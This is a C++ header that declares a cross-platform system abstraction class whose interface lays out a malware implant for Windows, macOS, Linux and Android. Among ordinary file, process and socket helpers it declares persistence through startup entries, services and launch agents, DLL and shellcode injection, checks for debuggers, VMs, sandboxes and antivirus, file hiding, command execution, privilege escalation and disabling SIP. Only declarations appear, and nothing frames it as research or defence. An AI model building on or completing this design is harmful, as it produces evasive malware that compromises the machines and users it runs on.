#pragma once

#include <string>
#include <vector>
#include <map>
#include <memory>
#include <functional>

// Platform detection
#ifdef _WIN32
    #define PLATFORM_WINDOWS
    #include <windows.h>
    #include <winreg.h>
    #include <shlobj.h>
    #include <tlhelp32.h>
    #include <psapi.h>
    #include <winsvc.h>
    #include <wininet.h>
    #include <crypt32.h>
    #include <iphlpapi.h>
    #include <ws2tcpip.h>
#elif defined(__APPLE__)
    #define PLATFORM_MACOS
    #include <TargetConditionals.h>
    #if TARGET_OS_IPHONE
        #define PLATFORM_IOS
    #endif
    #include <sys/types.h>
    #include <sys/sysctl.h>
    #include <sys/stat.h>
    #include <unistd.h>
    #include <pwd.h>
    #include <dlfcn.h>
    #include <mach-o/dyld.h>
    #include <CoreFoundation/CoreFoundation.h>
    #include <Security/Security.h>
    #include <SystemConfiguration/SystemConfiguration.h>
#elif defined(__ANDROID__)
    #define PLATFORM_ANDROID
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <unistd.h>
    #include <pwd.h>
    #include <dlfcn.h>
    #include <jni.h>
    #include <android/log.h>
    #include <android/native_activity.h>
#elif defined(__linux__)
    #define PLATFORM_LINUX
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <unistd.h>
    #include <pwd.h>
    #include <dlfcn.h>
    #include <dirent.h>
    #include <sys/sysinfo.h>
    #include <sys/utsname.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
#endif

// Common includes
#include <iostream>
#include <fstream>
#include <sstream>
#include <thread>
#include <chrono>
#include <random>
#include <algorithm>
#include <filesystem>

namespace fs = std::filesystem;

// Platform-specific types
#ifdef PLATFORM_WINDOWS
    typedef HANDLE PlatformHandle;
    typedef DWORD PlatformProcessId;
    typedef DWORD PlatformThreadId;
    typedef HKEY PlatformRegistryKey;
    typedef SOCKET PlatformSocket;
#else
    typedef int PlatformHandle;
    typedef pid_t PlatformProcessId;
    typedef pthread_t PlatformThreadId;
    typedef void* PlatformRegistryKey;
    typedef int PlatformSocket;
#endif

class PlatformAbstraction {
public:
    // Platform information
    static std::string getPlatformName();
    static std::string getOSVersion();
    static std::string getArchitecture();
    static std::string getHostname();
    static std::string getUsername();
    static std::string getHomeDirectory();
    static std::string getTempDirectory();
    static std::string getSystemDirectory();
    
    // Process management
    static PlatformProcessId getCurrentProcessId();
    static PlatformProcessId getParentProcessId();
    static std::vector<PlatformProcessId> getProcessList();
    static std::string getProcessName(PlatformProcessId pid);
    static std::string getProcessPath(PlatformProcessId pid);
    static bool isProcessRunning(PlatformProcessId pid);
    static bool terminateProcess(PlatformProcessId pid);
    static bool killProcessTree(PlatformProcessId pid);
    
    // File system
    static bool fileExists(const std::string& path);
    static bool directoryExists(const std::string& path);
    static std::vector<std::string> listDirectory(const std::string& path);
    static bool createDirectory(const std::string& path);
    static bool deleteFile(const std::string& path);
    static bool deleteDirectory(const std::string& path);
    static bool copyFile(const std::string& source, const std::string& destination);
    static bool moveFile(const std::string& source, const std::string& destination);
    static std::vector<uint8_t> readFile(const std::string& path);
    static bool writeFile(const std::string& path, const std::vector<uint8_t>& data);
    static bool hideFile(const std::string& path);
    static bool setFilePermissions(const std::string& path, int permissions);
    
    // Registry/Configuration (Windows) or equivalent (Unix)
    static bool createRegistryKey(const std::string& keyPath);
    static bool setRegistryValue(const std::string& keyPath, const std::string& valueName, const std::string& valueData);
    static std::string getRegistryValue(const std::string& keyPath, const std::string& valueName);
    static bool deleteRegistryKey(const std::string& keyPath);
    
    // Network
    static PlatformSocket createSocket();
    static bool connectSocket(PlatformSocket socket, const std::string& host, int port);
    static bool bindSocket(PlatformSocket socket, int port);
    static bool listenSocket(PlatformSocket socket, int backlog);
    static PlatformSocket acceptSocket(PlatformSocket socket);
    static int sendData(PlatformSocket socket, const std::vector<uint8_t>& data);
    static std::vector<uint8_t> receiveData(PlatformSocket socket, int maxSize);
    static void closeSocket(PlatformSocket socket);
    static std::string getLocalIP();
    static std::string getMACAddress();
    
    // System information
    static int getCPUCount();
    static uint64_t getTotalMemory();
    static uint64_t getAvailableMemory();
    static std::string getCPUArchitecture();
    static std::string getSystemLanguage();
    static std::string getTimeZone();
    
    // Persistence
    static bool createStartupEntry(const std::string& name, const std::string& path);
    static bool removeStartupEntry(const std::string& name);
    static std::vector<std::string> getStartupEntries();
    static bool createService(const std::string& name, const std::string& path);
    static bool removeService(const std::string& name);
    static bool startService(const std::string& name);
    static bool stopService(const std::string& name);
    
    // Encryption
    static std::vector<uint8_t> encryptData(const std::vector<uint8_t>& data, const std::string& key);
    static std::vector<uint8_t> decryptData(const std::vector<uint8_t>& data, const std::string& key);
    static std::string generateRandomString(int length);
    static std::vector<uint8_t> generateRandomBytes(int length);
    
    // Process injection
    static bool injectDLL(PlatformProcessId targetPid, const std::string& dllPath);
    static bool injectShellcode(PlatformProcessId targetPid, const std::vector<uint8_t>& shellcode);
    static bool createRemoteThread(PlatformProcessId targetPid, void* startAddress, void* parameter);
    
    // Anti-analysis
    static bool isDebuggerPresent();
    static bool isVirtualMachine();
    static bool isSandbox();
    static bool isAntivirusPresent();
    static bool isAnalysisToolPresent();
    
    // Utility
    static void sleep(int milliseconds);
    static uint64_t getCurrentTime();
    static std::string getEnvironmentVariable(const std::string& name);
    static bool setEnvironmentVariable(const std::string& name, const std::string& value);
    static std::string executeCommand(const std::string& command);
    static bool isElevated();
    static bool requestElevation();
    
    // Android-specific
    #ifdef PLATFORM_ANDROID
    static bool requestPermissions();
    static bool isRooted();
    static std::string getPackageName();
    static std::string getAPKPath();
    static bool installAPK(const std::string& apkPath);
    static bool uninstallPackage(const std::string& packageName);
    #endif
    
    // macOS-specific
    #ifdef PLATFORM_MACOS
    static bool isSIPEnabled();
    static bool disableSIP();
    static std::string getBundleIdentifier();
    static bool createLaunchAgent(const std::string& name, const std::string& path);
    static bool removeLaunchAgent(const std::string& name);
    #endif
    
    // Linux-specific
    #ifdef PLATFORM_LINUX
    static bool isRoot();
    static bool escalatePrivileges();
    static std::string getDistribution();
    static std::string getKernelVersion();
    static bool createSystemdService(const std::string& name, const std::string& path);
    static bool removeSystemdService(const std::string& name);
    #endif

private:
    // Platform-specific implementations
    #ifdef PLATFORM_WINDOWS
    static bool createWindowsService(const std::string& name, const std::string& path);
    static bool removeWindowsService(const std::string& name);
    static bool createWindowsStartupEntry(const std::string& name, const std::string& path);
    static bool removeWindowsStartupEntry(const std::string& name);
    static std::vector<std::string> getWindowsStartupEntries();
    static bool injectWindowsDLL(PlatformProcessId targetPid, const std::string& dllPath);
    static bool injectWindowsShellcode(PlatformProcessId targetPid, const std::vector<uint8_t>& shellcode);
    #elif defined(PLATFORM_MACOS)
    static bool createMacOSLaunchAgent(const std::string& name, const std::string& path);
    static bool removeMacOSLaunchAgent(const std::string& name);
    static std::vector<std::string> getMacOSLaunchAgents();
    static bool injectMacOSDLL(PlatformProcessId targetPid, const std::string& dllPath);
    static bool injectMacOSShellcode(PlatformProcessId targetPid, const std::vector<uint8_t>& shellcode);
    #elif defined(PLATFORM_LINUX)
    static bool createLinuxSystemdService(const std::string& name, const std::string& path);
    static bool removeLinuxSystemdService(const std::string& name);
    static std::vector<std::string> getLinuxSystemdServices();
    static bool injectLinuxDLL(PlatformProcessId targetPid, const std::string& dllPath);
    static bool injectLinuxShellcode(PlatformProcessId targetPid, const std::vector<uint8_t>& shellcode);
    #elif defined(PLATFORM_ANDROID)
    static bool createAndroidService(const std::string& name, const std::string& path);
    static bool removeAndroidService(const std::string& name);
    static std::vector<std::string> getAndroidServices();
    static bool injectAndroidDLL(PlatformProcessId targetPid, const std::string& dllPath);
    static bool injectAndroidShellcode(PlatformProcessId targetPid, const std::vector<uint8_t>& shellcode);
    #endif
};